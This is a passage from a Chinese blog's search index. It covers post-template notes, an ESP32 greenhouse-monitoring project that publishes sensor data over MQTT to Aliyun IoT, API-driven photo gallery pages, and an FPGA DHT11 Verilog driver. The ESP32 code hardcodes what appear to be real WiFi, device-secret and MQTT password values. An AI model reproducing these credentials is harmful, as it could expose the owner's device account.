display.print(&quot;Smoke: &quot;); display.print(smokePercentage, 2); display.println(&quot;%&quot;); display.display(); // 实际更新显示内容 delay(2000); &#125; 常用的YAML参数 参数 描述 默认值 layout 布局 config.default_layout title 标题 文章的文件名，同时也是网页标题 date 建立时间 文件建立时间 updated 更新时间 文件更新时间 comments 开启评论功能 true tags 标签 categories 分类 permalink 覆盖文章的永久链接，应该用&#x2F;或.html结尾 excerpt 纯文本的页面摘要 这里是一个基本的示例 &#x2F;# 基本信息title: 这是一个文章模版 # 标题date: 2024.4.28 # 时间tags: [模版] # 标签categories: [ ] # 分类description: 这是简介 # excerpt 也可&#x2F;# 封面cover: # 填入页面外部的封面banner: # 填入页面内部的封面poster: # 海报（可选，全图封面卡片） topic: # 标题上方的小字 headline: # 大标题 caption: # 标题下方的小字 color: # 标题颜色&#x2F;# 插件sticky: # 数字越大越靠前mermaid:katex:mathjax:leftbar: [ghuser, 朋友圈, tagcloud, timeline, welcome,] 图片引用单张图片格式&#123;% image https://cdn.jsdelivr.net/gh/zikwq/Blog_Pic/%E5%B0%8F%E6%81%B6%E9%AD%94%E7%8E%A9%E8%80%8D.png 小恶魔玩耍 download:https://cdn.jsdelivr.net/gh/zikwq/Blog_Pic/%E5%B0%8F%E6%81%B6%E9%AD%94%E7%8E%A9%E8%80%8D.png width:200px padding:16px bg:white %&#125; 小恶魔玩耍 多张图片格式&#123;% gallery %&#125; ![@tianhao_wang](https://images.unsplash.com/photo-1688142202243-e218ad203952?w=800&amp;auto=format&amp;fit=crop&amp;q=60&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHx0b3BpYy1mZWVkfDYzfEZ6bzN6dU9ITjZ3fHxlbnwwfHx8fHw%3D) ![@eberhard](https://images.unsplash.com/photo-1700994630045-f7a20df6d92e?w=800&amp;auto=format&amp;fit=crop&amp;q=60&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwcm9maWxlLXBhZ2V8MjN8fHxlbnwwfHx8fHw%3D) ![@eberhard](https://images.unsplash.com/photo-1533274221104-015a584a1005?w=800&amp;auto=format&amp;fit=crop&amp;q=60&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHx0b3BpYy1mZWVkfDE4fGJvOGpRS1RhRTBZfHxlbnwwfHx8fHw%3D) ![@eberhard](https://images.unsplash.com/photo-1539604214100-ab860d9082e0?w=800&amp;auto=format&amp;fit=crop&amp;q=60&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHx0b3BpYy1mZWVkfDIxfGJvOGpRS1RhRTBZfHxlbnwwfHx8fHw%3D) ![@eberhard](https://images.unsplash.com/photo-1698843848092-588f9c1bb0bd?w=800&amp;auto=format&amp;fit=crop&amp;q=60&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwcm9maWxlLXBhZ2V8Mzh8fHxlbnwwfHx8fHw%3D) ![@vklemen](https://images.unsplash.com/photo-1516571748831-5d81767b788d?q=80&amp;w=2574&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D) &#123;% endgallery %&#125; @tianhao_wang@eberhard@eberhard@eberhard@eberhard@vklemen","tags":["博客模版","YAML"]},{"title":"智慧大棚项目","path":"/2024/04/28/智慧大棚项目/","content":"器件介绍：开发板：core ESP32 S3 A10开发板 继电器：一路光耦继电器*2 温湿度传感器：DHT11 气体传感器：MQ2 功能介绍: 加入温湿度传感器 加入云端可控LED灯 加入MQ2气体传感器 加入控制电机继电器 加入报警流水灯继电器 加入报警蜂鸣器效果 任意阈值超过设定范围，出发报警效果 云端显示温度湿度有害气体百分比，可控led按键 连线方式：LCD9, 8, 3, 5, 6, 7—–&gt;rs, enable, d4, d5, d6, d7 Vo、R&#x2F;W、C–&gt;GND A—&gt;220欧姆电阻—&gt;5V OLED11—-&gt;SDA 12—-&gt;SCL DHT114——-&gt;data MQ-210号引脚 蜂鸣器一边17引脚，一边GND 电机继电器12号引脚，供电12V 流水灯继电器218号引脚，供电5V LED1号引脚 程序部分：main.cpp ```main.cpp /* 1. 加入温湿度传感器 2. 加入可控LED灯 3. 加入MQ2气体传感器 4. 加入控制电机继电器 5. 加入报警流水灯继电器 6. 加入报警蜂鸣器效果 7. 任意阈值超过设定范围，出发报警效果 */ #include &lt;Arduino.h&gt; #include &lt;WiFi.h&gt; #include &quot;PubSubClient.h&quot; ////A client library for MQTT messaging. #include &quot;DHT.h&quot; #include &lt;ArduinoJson.h&gt; #include &lt;LiquidCrystal.h&gt; // includes the LiquidCrystal Library #include &lt;Adafruit_SSD1306.h&gt; // 包含SSD1306 OLED屏幕库 #include &lt;SPI.h&gt; #include &lt;Adafruit_GFX.h&gt; #include &lt;Adafruit_SSD1306.h&gt; #define LED 1 #define LED2 2 //电机继电器1 #define LED3 18 //流水灯继电器2 #define buzzerPin 17 // 蜂鸣器连接到数字引脚17 #define DHTPIN 4 // Defines pin number to which the sensor is connected LiquidCrystal lcd(9, 8, 3, 5, 6, 7); // Creates an LCD object. Parameters: (rs, enable, d4, d5, d6, d7) // 定义MQ-2烟雾传感器连接的模拟输入引脚 const int smokeSensorPin = 10; // 定义OLED屏幕的宽度和高度（以像素为单位） #define SCREEN_WIDTH 128 #define SCREEN_HEIGHT 64 // 设置OLED显示屏的I2C地址（通常是0x3C或者0x3D） #define OLED_RESET -1 // 由于ESP32足够智能，可以设置为 -1 使用默认复位引脚 // 创建一个Adafruit_SSD1306对象。这里传递屏幕宽度、高度、I2C总线指针和复位引脚 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &amp;Wire, OLED_RESET); #define DHTTYPE DHT11 // DHT 22 DHT dht(DHTPIN, DHTTYPE); // Creats a DHT object /* 连接WIFI SSID和密码 */ #define WIFI_SSID &quot;abd&quot; #define WIFI_PASSWD &quot;00000010&quot; /* 设备的三元组信息*/ #define PRODUCT_KEY &quot;a1LG0hp3NmR&quot; #define DEVICE_NAME &quot;LittleCoke&quot; #define DEVICE_SECRET &quot;50d122d3e0ec5af748ccf8253f6b6a04&quot; #define REGION_ID &quot;cn-shanghai&quot; /* 线上环境域名和端口号，不需要改 */ #define MQTT_SERVER PRODUCT_KEY&quot;.iot-as-mqtt.&quot;REGION_ID &quot;.aliyuncs.com&quot; #define MQTT_PORT 1883 #define MQTT_USRNAME DEVICE_NAME&quot;&amp;&quot;PRODUCT_KEY #define CLIENT_ID &quot;a1LG0hp3NmR.LittleCoke|securemode=2,signmethod=hmacsha256,timestamp=1712915665471|&quot; #define MQTT_PASSWD &quot;07de62017cbc5135916c5f3d205cd40fe41c7e4f0f180cf62e094908d8591a8c&quot; //宏定义订阅主题 #define ALINK_BODY_FORMAT &quot;&#123;\\&quot;id\\&quot;:\\&quot;LittleCoke\\&quot;,\\&quot;version\\&quot;:\\&quot;1.0\\&quot;,\\&quot;method\\&quot;:\\&quot;thing.event.property.post\\&quot;,\\&quot;params\\&quot;:%s&#125;&quot; #define ALINK_TOPIC_PROP_POST &quot;/sys/&quot; PRODUCT_KEY &quot;/&quot; DEVICE_NAME &quot;/thing/event/property/post&quot; const char* TOPIC = &quot;/sys/a1uGtexAdr7/LittleCoke/thing/service/property/set&quot;; unsigned long lastMs = 0; WiFiClient espClient; PubSubClient client(espClient); // 函数声明 void alarmEffect(); float soil_data ; float tep; float smokePercentage; //连接wifi void wifiInit() &#123; WiFi.begin(WIFI_SSID, WIFI_PASSWD); while (WiFi.status() != WL_CONNECTED) &#123; delay(1000); Serial.println(&quot;WiFi not Connect&quot;); &#125; &#125; //mqtt连接 void mqttCheckConnect() &#123; while (!client.connected()) &#123; Serial.println(&quot;Connecting to MQTT Server ...&quot;); if(client.connect(CLIENT_ID, MQTT_USRNAME, MQTT_PASSWD)) &#123; Serial.println(&quot;MQTT Connected!&quot;); &#125; else&#123; Serial.print(&quot;MQTT Connect err:&quot;); Serial.println(client.state()); delay(5000); &#125; &#125; &#125; #include &lt;Arduino.h&gt; // 引入Arduino库以使用random函数 void alarmEffect() &#123; // 报警效果 for (int i = 0; i &lt; 10; i++) &#123; tone(buzzerPin, 1000); // 1000Hz频率 delay(random(30, 70)); // 随机延迟时间 noTone(buzzerPin); delay(random(30, 70)); // 随机延迟时间 &#125; &#125; //上传温湿度、二氧化碳浓度 void mqttIntervalPost() &#123; char param[32]; char jsonBuf[128]; //====================upload humidity======================================// soil_data = dht.readHumidity(); sprintf(param, &quot;&#123;\\&quot;humidity\\&quot;:%2f&#125;&quot;, soil_data); sprintf(jsonBuf, ALINK_BODY_FORMAT, param); Serial.println(jsonBuf); boolean b = client.publish(ALINK_TOPIC_PROP_POST, jsonBuf); if(b)&#123; Serial.println(&quot;publish Humidity success&quot;); &#125;else&#123; Serial.println(&quot;publish Humidity fail&quot;); &#125; //====================Upload temperature======================================// tep =dht.readTemperature(); sprintf(param, &quot;&#123;\\&quot;temperature\\&quot;:%2f&#125;&quot;,tep); sprintf(jsonBuf, ALINK_BODY_FORMAT, param); Serial.println(jsonBuf); boolean c = client.publish(ALINK_TOPIC_PROP_POST, jsonBuf); if(c)&#123; Serial.println(&quot;publish Temperature success&quot;); &#125;else&#123; Serial.println(&quot;publish Temperature fail&quot;); &#125; //====================upload qiti======================================// int smokeValue = analogRead(smokeSensorPin); // 读取MQ-2烟雾传感器的模拟值 // 将模拟值转换为百分比，这里的4095是ESP32 ADC的最大值 smokePercentage = (smokeValue / 4095.0) * 100.0; sprintf(param, &quot;&#123;\\&quot;smoke\\&quot;:%2f&#125;&quot;, smokePercentage); sprintf(jsonBuf, ALINK_BODY_FORMAT, param); Serial.println(jsonBuf); boolean d = client.publish(ALINK_TOPIC_PROP_POST, jsonBuf); if(d)&#123; Serial.println(&quot;publish smoke success&quot;); &#125;else&#123; Serial.println(&quot;publish smoke fail&quot;); &#125; const float TempThreshold = 30.0; // 设置温度阈值 const float HumThreshold = 60.0; // 设置湿度阈值 const float smokeThreshold = 60.0; // 设置烟雾阈值 if ((smokePercentage &gt; smokeThreshold) || (soil_data &gt; HumThreshold) || (tep &gt; TempThreshold)) &#123; digitalWrite(LED2,HIGH); digitalWrite(LED3,HIGH); alarmEffect(); &#125; else&#123; digitalWrite(LED2,LOW); digitalWrite(LED3,LOW); &#125; &#125; //回调函数 void callback(char* topic, byte* payload, unsigned int length) &#123; Serial.print(&quot;Message arrived [&quot;); Serial.print(topic); // 打印主题信息 Serial.print(&quot;] &quot;); for (int i = 0; i &lt; length; i++) &#123; Serial.print((char)payload[i]); // 打印主题内容 &#125; Serial.println(); DynamicJsonDocument doc(1024); //创建了一个名为 doc 的动态 JSON 文档 deserializeJson(doc, String((char *)payload)); //从一个名为 payload 的数据中解析 JSON 数据并将其填充到 doc 中 // DynamicJsonDocument params = doc[&quot;params&quot;]; if(doc[&quot;params&quot;].containsKey(&quot;deng&quot;)) &#123; Serial.println(&quot;GOT DENG CMD&quot;); digitalWrite(LED, doc[&quot;params&quot;][&quot;deng&quot;]); &#125; &#125; void setup() &#123; pinMode(LED, OUTPUT); pinMode(LED2, OUTPUT); pinMode(LED3, OUTPUT); pinMode(buzzerPin, OUTPUT); Serial.begin(115200); dht.begin(); wifiInit(); client.setServer(MQTT_SERVER, MQTT_PORT); /* 连接MQTT服务器 */ client.setCallback(callback); //设定回调方式，当ESP32收到订阅消息时会调用此方法 digitalWrite(LED,LOW); digitalWrite(LED2,LOW); digitalWrite(LED3,LOW); digitalWrite(buzzerPin,LOW); lcd.begin(16,2); // Initializes the interface to the LCD screen, and specifies the dimensions (width and height) of the display pinMode(smokeSensorPin, INPUT); // 设置MQ-2传感器所连接的引脚为输入模式 // 自定义I2C引脚 Wire.begin(11, 12); // SDA引脚设为11, SCL引脚设为12 // 初始化OLED屏幕，传入电源类型和I2C地址 if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) &#123; Serial.println(&quot;SSD1306初始化失败&quot;); for(;;); // 如果初始化失败，无限循环停在这里 &#125; display.clearDisplay(); // 清除屏幕内容到默认空状态 // 在屏幕上绘制一个像素点 display.drawPixel(10, 10, SSD1306_WHITE); // 设置文本大小和颜色 display.setTextSize(1); // 文本大小为1 display.setTextColor(SSD1306_WHITE); // 文本颜色为白色 // 设置文本开始位置 display.setCursor(0,0); display.println(&quot;Hello! ESP32!&quot;); // 在屏幕上打印文本 // 将上述内容更新到显示屏上 display.display(); &#125; void loop() &#123; if (millis() - lastMs &gt;= 5000) &#123; lastMs = millis(); mqttCheckConnect(); mqttIntervalPost(); &#125; client.loop(); lcd.setCursor(0,0); lcd.printf(&quot;Temp:%.2f &quot;, tep); lcd.print((char)223); lcd.print(&quot;C&quot;); lcd.setCursor(0,1); lcd.printf(&quot;Humi:%.2f &quot;, soil_data); lcd.print(&quot;%RH&quot;); // 在OLED屏幕上更新显示 display.clearDisplay(); // 清除旧的显示内容 display.setCursor(0, 10); display.print(&quot;Temp: &quot;); display.print(tep, 2); display.print((char)223); display.println(&quot;C&quot;); display.setCursor(0, 20); display.print(&quot;Humi: &quot;); display.print(soil_data, 2); display.println(&quot;%RH&quot;); display.setCursor(0, 30); display.print(&quot;Smoke: &quot;); display.print(smokePercentage, 2); display.println(&quot;%&quot;); display.display(); // 实际更新显示内容 delay(2000); &#125; platformio.ini ; PlatformIO Project Configuration File ; ; Build options: build flags, source filter ; Upload options: custom upload port, speed and extra flags ; Library options: dependencies, extra library storages ; Advanced options: extra scripting ; ; Please visit documentation for the other options and examples ; https://docs.platformio.org/page/projectconf.html [env:esp32-s3-devkitc-1] platform = espressif32 board = esp32-s3-devkitc-1 framework = arduino lib_deps = knolleary/PubSubClient@^2.8 adafruit/Adafruit Unified Sensor@^1.1.13 beegee-tokyo/DHT sensor library for ESPx@^1.19 adafruit/DHT sensor library@^1.4.4 bblanchon/ArduinoJson@^6.21.3 arduino-libraries/LiquidCrystal@^1.0.7 adafruit/Adafruit SSD1306@^2.5.9 应用方法： 修改注释为&#x2F;* 连接WIFI SSID和密码 *&#x2F;的部分 修改注释为&#x2F;* 设备的三元组信息*&#x2F;的部分 修改：CLIENT_ID 修改：MQTT_PASSWD 修改：TOPIC","tags":["项目","esp32"],"categories":["项目"]},{"path":"/baisi/index.html","content":"美女姐姐，刷新更新 /* CSS to style the image container */ .image-container { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px; } /* CSS to style each image */ img { width: calc(80% - 5px); /* 每行两张图片，减去间距 */ border-radius: 14px; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); } img:nth-child(2n+1) { margin-right: 10px; /* 图片之间的水平间距 */ } img:nth-child(n+3) { margin-top: 10px; /* 第三张图片及以后的图片与上一行的间距 */ } img:hover { cursor: pointer; opacity: 0.8; } async function fetchAndDisplayImages() { try { const imageContainer = document.getElementById('imageContainer'); const columnCount = 2; // 每行显示的列数 const columnHeights = new Array(columnCount).fill(0); // 每列的高度 for (let i = 0; i < 90; i++) { // Example: Call the API 90 times const response = await fetch('https://v2.api-m.com/api/baisi'); const data = await response.json(); if (data.code === 200) { const imageUrl = data.data; const img = document.createElement('img'); img.src = imageUrl; // 找到高度最小的列 const minHeight = Math.min(...columnHeights); const minIndex = columnHeights.indexOf(minHeight); // 设置图片样式 img.style.width = '100%'; img.style.borderRadius = '14px'; img.style.boxShadow = '2px 2px 8px rgba(0,0,0,0.2)'; img.style.marginBottom = '10px'; // 将图片插入到高度最小的列中 imageContainer.appendChild(img); columnHeights[minIndex] += img.offsetHeight + 10; // 更新列高度 } else { console.error('Failed to fetch image:', data.msg); } } } catch (error) { console.error('Error:', error); } } fetchAndDisplayImages();"},{"path":"/meinvpic/index.html","content":"美女姐姐，刷新更新 /* CSS to style the image container */ .image-container { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px; } /* CSS to style each image */ img { width: calc(80% - 5px); /* 每行两张图片，减去间距 */ border-radius: 14px; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); } img:nth-child(2n+1) { margin-right: 10px; /* 图片之间的水平间距 */ } img:nth-child(n+3) { margin-top: 10px; /* 第三张图片及以后的图片与上一行的间距 */ } img:hover { cursor: pointer; opacity: 0.8; } async function fetchAndDisplayImages() { try { const imageContainer = document.getElementById('imageContainer'); const columnCount = 2; // 每行显示的列数 const columnHeights = new Array(columnCount).fill(0); // 每列的高度 for (let i = 0; i < 90; i++) { // Example: Call the API 90 times const response = await fetch('https://v2.api-m.com/api/meinvpic'); const data = await response.json(); if (data.code === 200) { const imageUrl = data.data; const img = document.createElement('img'); img.src = imageUrl; // 找到高度最小的列 const minHeight = Math.min(...columnHeights); const minIndex = columnHeights.indexOf(minHeight); // 设置图片样式 img.style.width = '100%'; img.style.borderRadius = '14px'; img.style.boxShadow = '2px 2px 8px rgba(0,0,0,0.2)'; img.style.marginBottom = '10px'; // 将图片插入到高度最小的列中 imageContainer.appendChild(img); columnHeights[minIndex] += img.offsetHeight + 10; // 更新列高度 } else { console.error('Failed to fetch image:', data.msg); } } } catch (error) { console.error('Error:', error); } } fetchAndDisplayImages();"},{"path":"/heisi/index.html","content":"美女姐姐，刷新更新 /* CSS to style the image container */ .image-container { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px; } /* CSS to style each image */ img { width: calc(80% - 5px); /* 每行两张图片，减去间距 */ border-radius: 14px; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); } img:nth-child(2n+1) { margin-right: 10px; /* 图片之间的水平间距 */ } img:nth-child(n+3) { margin-top: 10px; /* 第三张图片及以后的图片与上一行的间距 */ } img:hover { cursor: pointer; opacity: 0.8; } async function fetchAndDisplayImages() { try { const imageContainer = document.getElementById('imageContainer'); const columnCount = 2; // 每行显示的列数 const columnHeights = new Array(columnCount).fill(0); // 每列的高度 for (let i = 0; i < 90; i++) { // Example: Call the API 90 times const response = await fetch('https://v2.api-m.com/api/heisi'); const data = await response.json(); if (data.code === 200) { const imageUrl = data.data; const img = document.createElement('img'); img.src = imageUrl; // 找到高度最小的列 const minHeight = Math.min(...columnHeights); const minIndex = columnHeights.indexOf(minHeight); // 设置图片样式 img.style.width = '100%'; img.style.borderRadius = '14px'; img.style.boxShadow = '2px 2px 8px rgba(0,0,0,0.2)'; img.style.marginBottom = '10px'; // 将图片插入到高度最小的列中 imageContainer.appendChild(img); columnHeights[minIndex] += img.offsetHeight + 10; // 更新列高度 } else { console.error('Failed to fetch image:', data.msg); } } } catch (error) { console.error('Error:', error); } } fetchAndDisplayImages();"},{"path":"/photos/index.html","content":"摄影�? document.addEventListener(\"DOMContentLoaded\", function () { let lazyImages = document.querySelectorAll('img[data-src]'); let options = { rootMargin: '0px', threshold: 0.5 }; let observer = new IntersectionObserver(function (entries, observer) { entries.forEach(function (entry) { if (entry.isIntersecting) { let lazyImage = entry.target; lazyImage.src = lazyImage.dataset.src; observer.unobserve(lazyImage); } }); }, options); lazyImages.forEach(function (lazyImage) { observer.observe(lazyImage); }); });"},{"path":"/photos/styles.css","content":".search { border: solid; border-radius: 12px; } img { border-radius: 14px; width: 100%; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); margin-bottom: 20px; /* 为图片之间添加垂直间距 */ } .waterfall_folw { column-gap: 5mm; column-count: 3; margin: 80px; line-height: 3rem; align-items: center; } img:hover { cursor: pointer; opacity: 0.8; }"},{"path":"/meinvshipin/index.html","content":"美女姐姐，刷新更新 /* CSS to style each video */ video { width: calc(50% - 5px); /* 每行两个视频，减去间距 */ border-radius: 14px; box-shadow: 2px 2px 8px rgba(0,0,0,0.2); } async function fetchAndDisplayVideo() { try { const videoContainer = document.getElementById('videoContainer'); const response = await fetch('https://v2.api-m.com/api/meinv'); const data = await response.json(); if (data.code === 200) { const videoUrl = data.data; const video = document.createElement('video'); video.src = videoUrl; video.autoplay = true; // 自动播放视频 video.loop = true; // 循环播放视频 video.controls = true; // 显示控件供用户控制播放 video.style.borderRadius = '14px'; video.style.boxShadow = '2px 2px 8px rgba(0,0,0,0.2)'; // 将视频插入到容器中 videoContainer.appendChild(video); } else { console.error('Failed to fetch video:', data.msg); } } catch (error) { console.error('Error:', error); } } fetchAndDisplayVideo();"},{"title":"DHT11温湿度显示","path":"/wiki/FPGA/DHT11温湿度显示.html","content":"实验展示DHT11温湿度数码管显示.MP4 DHT11相关文档DHT11数据格式 时序交互 信号持续时间 程序框图 状态机部分的状态转移图 整体波形图绘制 时钟的绘制，采用clk_us 程序部分顶层模块： dht11.vmodule dht11( input wire sys_clk, input wire sys_rst_n, inout wire dht11, input wire key, output wire [7:0]segdata, output wire [2:0]segcs ); wire key_flag; wire [19:0] data_out; key_filter #( .CNT_MAX(20&#x27;d999_999) ) key_filter_inst ( .sys_clk (sys_clk) , .sys_rst_n (sys_rst_n) , .key_in (key) , .led_out(), .key_flag(key_flag) ); dht11_ctrl dht11_ctrl_inst ( .sys_clk(sys_clk), .sys_rst_n(sys_rst_n), .key_flag(key_flag), .dht11(dht11), .data_out(data_out), .sign() ); seg seg_inst ( .clk(sys_clk), .rst_n(sys_rst_n), .tenvalue(data_out), // 这里连接没有问题 .segdata(segdata), .segcs(segcs) ); endmodule 6位数码管驱动模块： seg.v/* 数码管显示驱动，目前是直接设置固定数据 通过将tenvalue设置到输入端口，可以作为子模块，通过传入数据显示在数码管上面 */ module seg( input clk, input rst_n, input [19:0]tenvalue, output reg [7:0]segdata, output reg [2:0]segcs ); reg[31:0] count; reg[24:0]count1ms; reg[2:0]number; reg clk1ms; parameter sample=2&#x27;b00, display=2&#x27;b01; //-----------数码管驱动时钟----------- always@(posedge clk) begin if(count1ms &gt;= 25&#x27;d50000) // 1ms的计数器 begin clk1ms &lt;= ~clk1ms; count1ms &lt;= 1&#x27;d0; end else count1ms &lt;= count1ms + 1&#x27;d1; end //-----------从0开始显示数字----------- //assign tenvalue = 20&#x27;d99999; //固定显示999 //-----------数码管译码----------- function [7:0] leddata; input [3:0] datain; begin case(datain) 4&#x27;d0: leddata = 8&#x27;b11000000; // 0 4&#x27;d1: leddata = 8&#x27;b11111001; // 1 4&#x27;d2: leddata = 8&#x27;b10100100; // 2 4&#x27;d3: leddata = 8&#x27;b10110000; // 3 4&#x27;d4: leddata = 8&#x27;b10011001; // 4 4&#x27;d5: leddata = 8&#x27;b10010010; // 5 4&#x27;d6: leddata = 8&#x27;b10000010; // 6 4&#x27;d7: leddata = 8&#x27;b11111000; // 7 4&#x27;d8: leddata = 8&#x27;b10000000; // 8 4&#x27;d9: leddata = 8&#x27;b10010000; // 9 4&#x27;d10: leddata = 8&#x27;b10111111; // - 4&#x27;d11: leddata = 8&#x27;b01111111; // . default: leddata = 8&#x27;b11111111; endcase end endfunction //-----------数码管扫描----------- always@(posedge clk1ms or negedge rst_n) begin if(!rst_n) number &lt;= 3&#x27;d0; else if(number == 3&#x27;d5) number &lt;= 3&#x27;d0; else number &lt;= number + 1; case(number) 3&#x27;d0: begin segdata &lt;= leddata(tenvalue % 10); // 个位 segcs &lt;= 3&#x27;b101; end 3&#x27;d1: begin segdata &lt;= leddata((tenvalue / 10) % 10); // 十位 segcs &lt;= 3&#x27;b100; end 3&#x27;d2: begin segdata &lt;= leddata((tenvalue / 100) % 10); // 百位 segcs &lt;= 3&#x27;b011; end 4&#x27;d3: begin segdata&lt;=leddata((tenvalue/1000)%10);//千位 segcs&lt;=3&#x27;b010; end 4&#x27;d4: begin segdata&lt;=leddata((tenvalue/10000)%10);//万位 segcs&lt;=3&#x27;b001; end 4&#x27;d5: begin segdata&lt;=leddata((tenvalue/100000)%10);//十万位 segcs&lt;=3&#x27;b000; end default: begin segdata &lt;= 8&#x27;b11111111; // 或者其他默认值 segcs &lt;= 3&#x27;b111; // 或者其他默认值 end endcase end endmodule dht11驱动模块 dht11_ctrl.vmodule dht11_ctrl( input wire sys_clk, input wire sys_rst_n, input wire key_flag, inout wire dht11, output reg [19:0] data_out, output reg sign ); // 状态转移变量的赋值 parameter S_WAIT_1S = 3&#x27;d1 , //上电等待1s状态 S_LOW_18MS = 3&#x27;d2 , //主机拉低18ms，发送开始信号状态 S_DLY1 = 3&#x27;d3 , //等待20-40us状态 S_REPLY = 3&#x27;d4 , //DHT11响应80us状态 S_DLY2 = 3&#x27;d5 , //拉高等待80us状态 S_RD_DATA = 3&#x27;d6 ; //接收数据状态 parameter T_1S_DATA = 999999 ; //1s时间计数值 parameter T_18MS_DATA = 17999 ; //18ms时间计数值 // 内部参数的定义 reg clk_us; reg [4:0] cnt; reg [5:0] state; // 状态机变量 reg [19:0] cnt_us ; // 计数器 reg [19:0] cnt_low; // reg dht11_reg1; // reg dht11_reg2; // wire dht11_rise; // wire dht11_fall; // reg [5:0] bit_cnt; // 发送的bit计数，总共发送40bit的数据 reg [39:0] data_temp; reg [31:0] data; reg data_flag; // 数据发送的标志信号 reg dht11_en; // dht11使能信号 wire dht11_out; // // 生成us时钟信号 always @(posedge sys_clk or negedge sys_rst_n) begin if(!sys_rst_n) cnt &lt;= 5&#x27;d0; else if(cnt == 5&#x27;d24) cnt &lt;= 5&#x27;d0; else cnt &lt;= cnt+1&#x27;d1; end always @(posedge sys_clk or negedge sys_rst_n) begin if(!sys_rst_n) clk_us &lt;= 1&#x27;d0; else if(cnt == 5&#x27;d24) clk_us &lt;= ~clk_us; else clk_us &lt;= clk_us; end //状态机状态跳转 always@(posedge clk_us or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) state &lt;= S_WAIT_1S ; else case(state) S_WAIT_1S: if(cnt_us == T_1S_DATA) //上电1s后跳入起始状态 state &lt;= S_LOW_18MS ; else state &lt;= S_WAIT_1S ; S_LOW_18MS: if(cnt_us == T_18MS_DATA) state &lt;= S_DLY1 ; else state &lt;= S_LOW_18MS ; S_DLY1: if(cnt_us == 10) //等待10us后进入下一状态 state &lt;= S_REPLY ; else state &lt;= S_DLY1 ; S_REPLY: //上升沿到来且低电平保持时间大于70us，则跳转到下一状态 if(dht11_rise == 1&#x27;b1 &amp;&amp; cnt_low &gt;= 70) state &lt;= S_DLY2 ; //若1ms后，dht11还没响应，则回去继续发送起始信号 else if(cnt_us &gt;= 1000) state &lt;= S_LOW_18MS ; else state &lt;= S_REPLY ; S_DLY2: //下降沿到来且计数器值大于70us，则跳转到下一状态 if(dht11_fall == 1&#x27;b1 &amp;&amp; cnt_us &gt;= 70) state &lt;= S_RD_DATA ; else state &lt;= S_DLY2 ; S_RD_DATA: //读完数据后，回到起始状态 if(bit_cnt == 40 &amp;&amp; dht11_rise == 1&#x27;b1) state &lt;= S_LOW_18MS ; else state &lt;= S_RD_DATA ; default: state &lt;= S_WAIT_1S ; endcase //各状态下的计数器赋值 //cnt_us:每到一个新的状态就让该计数器重新计数 always@(posedge clk_us or negedge sys_rst_n) if(sys_rst_n == 1&#x27;b0) begin cnt_low &lt;= 7&#x27;d0 ; cnt_us &lt;= 21&#x27;d0 ; end else case(state) S_WAIT_1S: if(cnt_us == T_1S_DATA) cnt_us &lt;= 21&#x27;d0 ; else cnt_us &lt;= cnt_us + 1&#x27;b1; S_LOW_18MS: if(cnt_us == T_18MS_DATA) cnt_us &lt;= 21&#x27;d0 ; else cnt_us &lt;= cnt_us + 1&#x27;b1; S_DLY1: if(cnt_us == 10) cnt_us &lt;= 21&#x27;d0 ; else cnt_us &lt;= cnt_us + 1&#x27;b1; S_REPLY: if(dht11_rise == 1&#x27;b1 &amp;&amp; cnt_low &gt;= 70) begin cnt_low &lt;= 7&#x27;d0 ; cnt_us &lt;= 21&#x27;d0 ; end //当dht11发送低电平回应时，计算其低电平的持续时间 else if(dht11 == 1&#x27;b0) begin cnt_low &lt;= cnt_low + 1&#x27;b1 ; cnt_us &lt;= cnt_us + 1&#x27;b1 ; end //若1ms后，dht11还没响应，则回去继续发送起始信号 else if(cnt_us &gt;= 1000) begin cnt_low &lt;= 7&#x27;d0 ; cnt_us &lt;= 21&#x27;d0 ; end else begin cnt_low &lt;= cnt_low ; cnt_us &lt;= cnt_us + 1&#x27;b1 ; end S_DLY2: if(dht11_fall == 1&#x27;b1 &amp;&amp; cnt_us &gt;= 70) cnt_us &lt;= 21&#x27;d0 ; else cnt_us &lt;= cnt_us + 1&#x27;b1; S_RD_DATA: if(dht11_fall == 1&#x27;b1 || dht11_rise == 1&#x27;b1) cnt_us &lt;= 21&#x27;d0 ; else cnt_us &lt;= cnt_us + 1&#x27;b1; default: begin cnt_low &lt;= 7&#x27;d0 ; cnt_us &lt;= 21&#x27;d0 ; end endcase // 打两拍，提取dht11的输入信号的上升沿和下降沿 always @(posedge clk_us or negedge sys_rst_n) begin if(!sys_rst_n) begin dht11_reg1 &lt;= 1&#x27;d1; dht11_reg2 &lt;= 1&#x27;d1; end else begin dht11_reg1 &lt;= dht11; dht11_reg2 &lt;= dht11_reg1; end end assign dht11_rise = (~dht11_reg2) &amp;&amp; (dht11_reg1) ; assign dht11_fall = (dht11_reg2) &amp;&amp; (~dht11_reg1) ; // bit_cnt的搭建 always @(posedge clk_us or negedge sys_rst_n) begin if(!sys_rst_n) bit_cnt &lt;= 6&#x27;d0; else if(bit_cnt == 6&#x27;d40 &amp;&amp; dht11_rise == 1&#x27;d1) bit_cnt &lt;= 6&#x27;d0; else if(state == S_RD_DATA &amp;&amp; dht11_fall == 1&#x27;d1) bit_cnt &lt;= bit_cnt + 1&#x27;d1; else bit_cnt &lt;= bit_cnt; end // data_temp always @(posedge clk_us or negedge sys_rst_n) begin if(!sys_rst_n) data_temp &lt;= 40&#x27;d0; else if(state == S_RD_DATA &amp;&amp; dht11_fall == 1&#x27;d1 &amp;&amp; cnt_us &lt;=50) data_temp[39-bit_cnt] &lt;= 1&#x27;d0; else if(state == S_RD_DATA &amp;&amp; dht11_fall == 